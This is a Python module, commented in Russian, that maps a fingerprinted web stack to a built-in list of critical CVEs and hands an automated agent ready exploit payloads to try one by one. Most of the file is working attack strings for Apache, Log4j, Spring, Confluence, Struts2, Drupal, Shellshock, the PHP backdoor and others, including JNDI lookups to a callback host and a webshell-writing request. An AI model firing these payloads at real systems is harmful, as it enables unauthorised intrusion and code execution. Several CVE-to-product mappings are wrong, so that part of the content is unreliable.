"""
Kryx CVE Intelligence - автоматическое сопоставление стека с CVE и тест каждого.

Логика:
  1. Принимает стек из recon/whatweb ({"Apache": "2.4.49", "WordPress": "5.8", ...})
  2. Возвращает приоритизированный список CVE с готовыми payloads и инструкцией как тестировать
  3. Для неизвестных версий — запрос в NVD API
  4. Агент получает это как контекст и тестирует CVE одно за другим

Используется двумя путями:
  - CVE-aware hunter получает этот контекст в начале
  - Инструмент cve_exploit_probe тестирует конкретный CVE по ID
"""
import re
import httpx
import asyncio

# ─────────────────────────────────────────────────────────────────────────────
# Встроенная база критических CVE (top exploited, по данным CISA KEV + MITRE)
# Структура: (regex_product, regex_version_range, cve_id, cvss, title, test_type)
# test_type: "nuclei" | "payload" | "msf" | "manual"
# ─────────────────────────────────────────────────────────────────────────────

CVE_KB: list[dict] = [
    # ── Apache HTTPD ─────────────────────────────────────────────────────────
    {
        "product": r"apache.*httpd|apache[/ ]2\.4\.4[89]",
        "cve": "CVE-2021-41773",
        "cvss": 9.8,
        "title": "Apache HTTP Server 2.4.49 Path Traversal + RCE",
        "technique": "path_traversal_rce",
        "payload": {
            "method": "GET",
            "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
            "headers": {"Content-Type": "text/plain"},
            "body": "echo Content-Type: text/plain; echo; id",
        },
        "confirm_pattern": r"(uid=\d+|www-data|root|apache)",
        "description": "Path traversal в mod_cgi → RCE. Сначала проверь /cgi-bin/. "
                       "Без mod_cgi даёт только file read.",
        "nuclei_tags": ["CVE-2021-41773"],
    },
    {
        "product": r"apache.*httpd|apache[/ ]2\.4\.50",
        "cve": "CVE-2021-42013",
        "cvss": 9.8,
        "title": "Apache HTTP Server 2.4.50 Path Traversal (bypass patch 41773)",
        "technique": "path_traversal_rce",
        "payload": {
            "method": "GET",
            "path": "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh",
            "body": "echo Content-Type: text/plain; echo; id",
        },
        "confirm_pattern": r"(uid=\d+|www-data|root)",
        "description": "Обход патча 41773 через двойное кодирование. Требует mod_cgi.",
        "nuclei_tags": ["CVE-2021-42013"],
    },

    # ── Log4j / Log4Shell ────────────────────────────────────────────────────
    {
        "product": r"log4j|spring|java|tomcat|struts|jenkins|vmware|cisco|pulse",
        "cve": "CVE-2021-44228",
        "cvss": 10.0,
        "title": "Log4Shell - JNDI RCE in Log4j 2.x",
        "technique": "log4shell",
        "payload": {
            "headers": {
                "User-Agent": "${jndi:ldap://{{callback}}/log4shell}",
                "X-Forwarded-For": "${jndi:ldap://{{callback}}/a}",
                "X-Api-Version": "${jndi:ldap://{{callback}}/b}",
                "Referer": "${jndi:ldap://{{callback}}/c}",
            },
            "params_inject": "${jndi:ldap://{{callback}}/p}",
        },
        "confirm_pattern": "oob_callback",
        "description": "Любое Java-приложение использующее Log4j 2.0-2.14.1. "
                       "Инжектируй во все заголовки и параметры. OOB подтверждение через interactsh/webhook.",
        "nuclei_tags": ["CVE-2021-44228", "log4shell"],
    },

    # ── Spring Framework ─────────────────────────────────────────────────────
    {
        "product": r"spring|spring.?boot|springframework",
        "cve": "CVE-2022-22965",
        "cvss": 9.8,
        "title": "Spring4Shell - Spring Framework RCE via DataBinder",
        "technique": "spring4shell",
        "payload": {
            "method": "POST",
            "params": {
                "class.module.classLoader.resources.context.parent.pipeline"
                ".first.pattern": "%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
            },
        },
        "confirm_pattern": r"tomcatwar\.jsp",
        "description": "Spring MVC/WebFlux на JDK 9+. POST с class.module.* параметрами → webshell.",
        "nuclei_tags": ["CVE-2022-22965", "spring4shell"],
    },

    # ── Confluence ───────────────────────────────────────────────────────────
    {
        "product": r"confluence",
        "cve": "CVE-2022-26134",
        "cvss": 10.0,
        "title": "Confluence Server OGNL Injection RCE",
        "technique": "ognl_rce",
        "payload": {
            "method": "GET",
            "path": "/%24%7B%28%23a%3D%40org.apache.commons.lang.SystemUtils%40IS_OS_WINDOWS%29."
                   "%28%23cmds%3D%28%23a%3F%5B%27cmd.exe%27%2C%27%2Fc%27%2C%27whoami%27%5D%3A"
                   "%5B%27%2Fbin%2Fsh%27%2C%27-c%27%2C%27id%27%5D%29%29.%28%23p%3Dnew%20"
                   "java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29."
                   "%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28"
                   "%23process.getInputStream%28%29%29%29%7D/",
        },
        "confirm_pattern": r"(uid=\d+|root|confluence|www-data|administrator)",
        "description": "Confluence Server и Data Center ≤7.18.0. OGNL инъекция в URL.",
        "nuclei_tags": ["CVE-2022-26134"],
    },

    # ── GitLab ───────────────────────────────────────────────────────────────
    {
        "product": r"gitlab",
        "cve": "CVE-2021-22205",
        "cvss": 10.0,
        "title": "GitLab Unauthenticated RCE via ExifTool",
        "technique": "file_upload_rce",
        "payload": {
            "method": "POST",
            "path": "/uploads/user",
            "note": "Upload DjVu image with malicious metadata. Nuclei template available.",
        },
        "confirm_pattern": "oob_callback",
        "description": "GitLab CE/EE 11.9-13.10.2. Загрузка DjVu с RCE payloads через ExifTool.",
        "nuclei_tags": ["CVE-2021-22205"],
    },

    # ── WordPress ────────────────────────────────────────────────────────────
    {
        "product": r"wordpress|wp-",
        "cve": "CVE-2019-8942",
        "cvss": 8.8,
        "title": "WordPress ≤5.0.0 Authenticated RCE via File Upload",
        "technique": "wp_rce",
        "payload": {
            "note": "Requires author credentials. Upload PHP file via media upload + path traversal.",
        },
        "confirm_pattern": r"phpinfo|system\(",
        "description": "Аутентифицированный RCE. Требует как минимум Author-роль.",
        "nuclei_tags": ["CVE-2019-8942", "wordpress-rce"],
    },
    {
        "product": r"wordpress|wp-",
        "cve": "CVE-2021-34940",
        "cvss": 9.8,
        "title": "WordPress Plugin RCE (scan plugins)",
        "technique": "nuclei_wp_plugins",
        "payload": {},
        "confirm_pattern": "nuclei",
        "description": "Запусти nuclei с wordpress-тегом — тысячи шаблонов для WP плагинов/тем.",
        "nuclei_tags": ["wordpress", "wp-plugin"],
    },

    # ── Drupal ───────────────────────────────────────────────────────────────
    {
        "product": r"drupal",
        "cve": "CVE-2018-7600",
        "cvss": 9.8,
        "title": "Drupalgeddon2 - Drupal 6/7/8 RCE",
        "technique": "drupalgeddon2",
        "payload": {
            "method": "POST",
            "path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
            "data": {
                "form_id": "user_register_form",
                "_drupal_ajax": "1",
                "mail[#post_render][]": "exec",
                "mail[#type]": "markup",
                "mail[#markup]": "id",
            },
        },
        "confirm_pattern": r"uid=\d+",
        "description": "Drupal ≤7.57, ≤8.3.9. Unauthenticated RCE через Form API.",
        "nuclei_tags": ["CVE-2018-7600", "drupalgeddon"],
    },

    # ── Struts2 ──────────────────────────────────────────────────────────────
    {
        "product": r"struts|apache.?struts",
        "cve": "CVE-2017-5638",
        "cvss": 10.0,
        "title": "Apache Struts2 Content-Type RCE (Equifax breach)",
        "technique": "struts_rce",
        "payload": {
            "method": "POST",
            "headers": {
                "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                                "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                                "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                                "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
                                "(#context.setMemberAccess(#dm)))).(#cmd='id')."
                                "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                                "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                                "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
                                "(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                                "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
            },
        },
        "confirm_pattern": r"uid=\d+",
        "description": "Apache Struts2 2.3.5-2.3.31, 2.5-2.5.10. Многомиллиардный breach Equifax.",
        "nuclei_tags": ["CVE-2017-5638"],
    },

    # ── Exchange / ProxyLogon ────────────────────────────────────────────────
    {
        "product": r"exchange|microsoft.*exchange|owa",
        "cve": "CVE-2021-26855",
        "cvss": 9.8,
        "title": "ProxyLogon - Exchange Server SSRF → RCE",
        "technique": "proxylogon",
        "payload": {
            "method": "GET",
            "path": "/owa/auth/x.js",
            "headers": {"Cookie": "X-AnonResource=true; path=/logon/; secure;X-AnonResource-Backend=localhost/ecp/default.flt?~3;"},
        },
        "confirm_pattern": r"200|ecp",
        "description": "Exchange 2013-2019 без патча Mar2021. ProxyLogon SSRF + code execution.",
        "nuclei_tags": ["CVE-2021-26855", "proxylogon"],
    },

    # ── VMware vCenter ───────────────────────────────────────────────────────
    {
        "product": r"vcenter|vmware.*vcenter",
        "cve": "CVE-2021-21985",
        "cvss": 9.8,
        "title": "VMware vCenter Server RCE via vSAN",
        "technique": "nuclei_vcenter",
        "payload": {},
        "confirm_pattern": "nuclei",
        "description": "vCenter Server 6.5-7.0. Plugin Manager vSAN → RCE. Nuclei шаблон есть.",
        "nuclei_tags": ["CVE-2021-21985", "vcenter"],
    },

    # ── Citrix / Pulse VPN ───────────────────────────────────────────────────
    {
        "product": r"citrix|netscaler",
        "cve": "CVE-2019-19781",
        "cvss": 9.8,
        "title": "Citrix ADC / Gateway Path Traversal + RCE",
        "technique": "path_traversal",
        "payload": {
            "method": "GET",
            "path": "/vpns/../vpns/cfg/smb.conf",
        },
        "confirm_pattern": r"\[global\]|\[netlogon\]",
        "description": "Citrix ADC ≤12.1.50.28. Path traversal → command injection → RCE.",
        "nuclei_tags": ["CVE-2019-19781"],
    },

    # ── PHP ──────────────────────────────────────────────────────────────────
    {
        "product": r"php[/ ]8\.1\.0-dev",
        "cve": "CVE-2021-3129",
        "cvss": 9.8,
        "title": "PHP 8.1.0-dev Backdoor RCE",
        "technique": "php_backdoor",
        "payload": {
            "method": "GET",
            "headers": {"User-Agentt": "zerodiumsystem('id');"},
        },
        "confirm_pattern": r"uid=\d+",
        "description": "PHP 8.1.0-dev содержит backdoor в User-Agentt заголовке.",
        "nuclei_tags": ["CVE-2021-3129"],
    },

    # ── Shellshock ───────────────────────────────────────────────────────────
    {
        "product": r"bash|cgi|apache|nginx",
        "cve": "CVE-2014-6271",
        "cvss": 9.8,
        "title": "Shellshock - Bash CGI RCE",
        "technique": "shellshock",
        "payload": {
            "method": "GET",
            "path": "/cgi-bin/test.cgi",
            "headers": {
                "User-Agent": "() { :; }; echo; echo; /bin/bash -c 'id'",
                "Referer": "() { :; }; echo; echo; /bin/bash -c 'id'",
            },
        },
        "confirm_pattern": r"uid=\d+",
        "description": "CGI-скрипты на Bash. Всё ещё живёт на embedded устройствах и legacy серверах.",
        "nuclei_tags": ["CVE-2014-6271", "shellshock"],
    },

    # ── Heartbleed ───────────────────────────────────────────────────────────
    {
        "product": r"openssl[/ ]1\.[01]|openssl 0\.",
        "cve": "CVE-2014-0160",
        "cvss": 7.5,
        "title": "Heartbleed - OpenSSL Memory Leak",
        "technique": "nuclei_ssl",
        "payload": {},
        "confirm_pattern": "nuclei",
        "description": "OpenSSL 1.0.1 - 1.0.1f. Nuclei/testssl умеют детектировать.",
        "nuclei_tags": ["CVE-2014-0160", "heartbleed"],
    },

    # ── Joomla ───────────────────────────────────────────────────────────────
    {
        "product": r"joomla",
        "cve": "CVE-2023-23752",
        "cvss": 7.5,
        "title": "Joomla Information Disclosure → Config Leak",
        "technique": "info_disclosure",
        "payload": {
            "method": "GET",
            "path": "/api/index.php/v1/config/application?public=true",
        },
        "confirm_pattern": r"\"db\"|\"password\"|\"host\"",
        "description": "Joomla 4.0.0-4.2.7. API раскрывает конфиги БД без аутентификации.",
        "nuclei_tags": ["CVE-2023-23752"],
    },

    # ── Nginx ────────────────────────────────────────────────────────────────
    {
        "product": r"nginx[/ ]1\.[01][0-8]\.",
        "cve": "CVE-2013-4547",
        "cvss": 7.5,
        "title": "Nginx off-by-slash path traversal",
        "technique": "path_traversal",
        "payload": {
            "method": "GET",
            "path": "/uploads../etc/passwd",
        },
        "confirm_pattern": r"root:.*:0:0:",
        "description": "nginx ≤1.19.x. Misconfigured alias + путь без слеша → path traversal.",
        "nuclei_tags": ["nginx-alias-traversal"],
    },

    # ── Node.js / Express ────────────────────────────────────────────────────
    {
        "product": r"node[.]js|express|next[.]js",
        "cve": "CVE-2022-24999",
        "cvss": 9.8,
        "title": "Express.js / qs Prototype Pollution → RCE",
        "technique": "prototype_pollution",
        "payload": {
            "method": "GET",
            "params": {"__proto__[outputFunctionName]": "_tmp1;global.process.mainModule.require('child_process').execSync('id');//"},
        },
        "confirm_pattern": r"uid=\d+",
        "description": "Express + Pug/Jade template engine + qs < 6.10.3. Prototype pollution → template RCE.",
        "nuclei_tags": ["CVE-2022-24999"],
    },

    # ── Jupyter ──────────────────────────────────────────────────────────────
    {
        "product": r"jupyter",
        "cve": "CVE-2022-24758",
        "cvss": 7.8,
        "title": "Jupyter Notebook без аутентификации — прямой RCE",
        "technique": "jupyter_rce",
        "payload": {
            "method": "POST",
            "path": "/api/kernels",
            "body": {"name": "python3"},
            "note": "Create kernel → POST /api/kernels/{id}/execute → code=__import__('os').system('id')",
        },
        "confirm_pattern": r"kernel_id|execution_count",
        "description": "Открытый Jupyter без токена. Полный RCE через API.",
        "nuclei_tags": ["jupyter-unauth"],
    },
]


def match_tech(tech_stack: dict | str) -> list[dict]:
    """
    tech_stack: {"Apache": "2.4.49", "PHP": "7.4", ...}  или строка из whatweb
    Возвращает список подходящих CVE, приоритизированных по CVSS.
    """
    if isinstance(tech_stack, str):
        blob = tech_stack.lower()
    else:
        blob = " ".join(f"{k} {v}" for k, v in tech_stack.items()).lower()

    matched = []
    for cve in CVE_KB:
        if re.search(cve["product"], blob, re.I):
            matched.append(cve)

    # Приоритет: CVSS descending
    matched.sort(key=lambda c: -c.get("cvss", 0))
    return matched


async def nvd_lookup(tech: str, version: str, max_results: int = 5) -> list[dict]:
    """
    Запрос в NVD API для конкретной технологии и версии.
    Возвращает CVE с CVSS >= 7.0, свежие сначала.
    """
    keyword = f"{tech} {version}".strip()
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            r = await client.get(
                "https://services.nvd.nist.gov/rest/json/cves/2.0",
                params={"keywordSearch": keyword, "resultsPerPage": max_results},
                headers={"User-Agent": "Kryx-CVE-Intel/1.0"},
            )
            data = r.json()
            results = []
            for item in data.get("vulnerabilities", []):
                cve_data = item["cve"]
                metrics = cve_data.get("metrics", {})
                cvss = (
                    metrics.get("cvssMetricV31", [{}])[0].get("cvssData", {}).get("baseScore")
                    or metrics.get("cvssMetricV30", [{}])[0].get("cvssData", {}).get("baseScore")
                    or metrics.get("cvssMetricV2", [{}])[0].get("cvssData", {}).get("baseScore")
                )
                if cvss and float(cvss) < 7.0:
                    continue  # skip low/medium
                desc_list = cve_data.get("descriptions", [])
                desc = next((d["value"] for d in desc_list if d.get("lang") == "en"), "")
                refs = [r.get("url", "") for r in cve_data.get("references", [])[:3]]
                results.append({
                    "cve": cve_data["id"],
                    "cvss": cvss,
                    "description": desc[:400],
                    "published": cve_data.get("published", "")[:10],
                    "references": refs,
                    "source": "nvd",
                })
            # Sort by CVSS
            results.sort(key=lambda x: -(float(x.get("cvss") or 0)))
            return results
    except Exception:
        return []


async def build_cve_context(tech_stack: dict | str, do_nvd: bool = True) -> dict:
    """
    Полный CVE-контекст для данного стека.
    Используется в cve_hunter для формирования контекста агента.

    Returns:
        {
            "built_in": [cve_dicts],   # из встроенной базы
            "nvd": [cve_dicts],        # из NVD (если do_nvd)
            "summary": "Apache 2.4.49: 2 CVE (CVE-2021-41773 CVSS 9.8, ...)"
        }
    """
    built_in = match_tech(tech_stack)

    nvd_results = []
    if do_nvd and isinstance(tech_stack, dict):
        tasks = [nvd_lookup(tech, ver) for tech, ver in list(tech_stack.items())[:3]]
        for batch in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(batch, list):
                nvd_results.extend(batch)
        # dedupe by CVE ID
        seen = {c["cve"] for c in built_in}
        nvd_results = [c for c in nvd_results if c["cve"] not in seen]

    # Summary string for hunter context
    lines = []
    for c in built_in[:6]:
        lines.append(f"  • {c['cve']} (CVSS {c['cvss']}) — {c['title']}")
    for c in nvd_results[:4]:
        lines.append(f"  • {c['cve']} (CVSS {c.get('cvss','?')}) — {c['description'][:80]}")

    summary = "CVE по обнаруженному стеку:\n" + "\n".join(lines) if lines else "CVE не найдены для стека"

    return {
        "built_in": built_in,
        "nvd": nvd_results,
        "summary": summary,
    }
